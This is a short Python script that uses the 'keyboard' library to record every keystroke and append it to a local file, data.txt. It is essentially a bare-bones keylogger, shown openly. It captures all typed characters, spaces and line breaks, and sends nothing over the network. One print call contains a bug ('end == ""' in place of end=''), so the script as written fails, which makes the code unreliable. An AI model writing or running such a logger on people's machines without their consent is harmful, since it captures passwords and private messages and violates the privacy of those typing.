import keyboard

path = "data.txt"

with open(path, "a") as data_file :
    while True : 
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            if len(key) == 1:
                print(key, end == "", flush=True)
                data_file.write(key)
            elif key == "space" :
                print(" ", end='', flush=True)
                data_file.write(" ")
            elif key == "enter":
                print("\n")
                data_file.write("\n")

